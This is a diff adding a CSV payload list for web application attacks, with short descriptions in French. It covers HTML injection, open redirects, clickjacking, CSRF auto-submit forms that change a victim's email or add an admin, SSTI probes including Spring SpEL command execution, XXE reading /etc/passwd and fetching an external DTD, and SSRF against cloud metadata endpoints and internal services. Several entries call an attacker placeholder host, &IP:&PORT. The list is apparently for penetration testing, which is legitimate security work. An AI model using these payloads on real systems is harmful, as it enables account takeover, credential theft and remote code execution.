@@ -1,0 +1,40 @@
+payload,description
+<h1>Injected</h1>,HTML injection — heading visible
+<marquee>XSS Test</marquee>,HTML injection — marquee (obsolète)
+<b>Bold injected text</b>,HTML injection — gras
+<s>Strikethrough</s>,HTML injection — barré
+<img src='https://&IP/logo.png'>,HTML injection — image externe
+<a href='http://&IP:&PORT/'>Click here</a>,HTML injection — lien externe
+<form action='http://&IP:&PORT/' method='POST'><input type='submit'></form>,HTML injection — form redirection
+<meta http-equiv='refresh' content='0;url=http://&IP:&PORT/'>,Redirect meta refresh
+<script>window.location='http://&IP:&PORT/'</script>,Redirect JS window.location
+<script>window.location.href='http://&IP:&PORT/'</script>,Redirect JS href
+javascript:window.location='http://&IP:&PORT/',Redirect javascript: URL
+<iframe src='https://target.com' style='opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;'>,Clickjacking — iframe transparent
+<iframe src='https://target.com/account/delete' width=0 height=0 style='visibility:hidden;'>,Clickjacking — action cachée
+<link rel='stylesheet' href='http://&IP:&PORT/css'>,CSS injection — détection via link
+"<img src='http://&IP:&PORT/log?page=DOCUMENT_URL' onerror='this.src=""http://&IP:&PORT/log?page=""+document.URL'>",HTML — tracking URL
+<form action='http://target/change_email' method='POST'><input name='email' value='attacker@evil.com'><script>document.forms[0].submit()</script></form>,CSRF — changement email auto-submit
+<img src='http://target/api/addadmin?user=attacker'>,CSRF GET — ajout admin
+<iframe src='http://target/logout'>,CSRF — déconnexion
+{{7*7}},SSTI — test basique Jinja2/Twig
+${7*7},SSTI — test Freemarker/Thymeleaf
+<%= 7*7 %>,SSTI — test ERB (Ruby)
+{{config}},SSTI Jinja2 — dump config Flask
+{{self.__dict__}},SSTI Jinja2 — attributs self
+{{''.__class__.__mro__[2].__subclasses__()}},SSTI Jinja2 — énumération classes
+${T(java.lang.Runtime).getRuntime().exec('id')},SSTI Spring SpEL — RCE id
+"{{range.constructor(""return eval('fetch(\""http://&IP:&PORT\"")')"")()}}",SSTI Angular RCE — fetch
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>,XXE — lecture /etc/passwd
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://&IP:&PORT/'>]><root>&xxe;</root>,XXE — SSRF vers &IP:&PORT
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://&IP:&PORT/evil.dtd'>%xxe;]>,XXE — OOB via DTD externe
+http://169.254.169.254/latest/meta-data/,SSRF — AWS metadata IMDSv1
+http://169.254.169.254/latest/user-data/,SSRF — AWS user-data
+http://metadata.google.internal/computeMetadata/v1/,SSRF — GCP metadata
+http://100.100.100.200/latest/meta-data/,SSRF — Alibaba Cloud metadata
+http://localhost:6379/,SSRF — Redis local
+http://localhost:27017/,SSRF — MongoDB local
+http://localhost:8500/v1/kv/?recurse,SSRF — Consul KV store
+dict://&IP:&PORT/,SSRF via dict:// — détection port
+gopher://&IP:&PORT/_,SSRF via gopher:// — exfil
+file:///etc/passwd,SSRF file:// — lecture locale
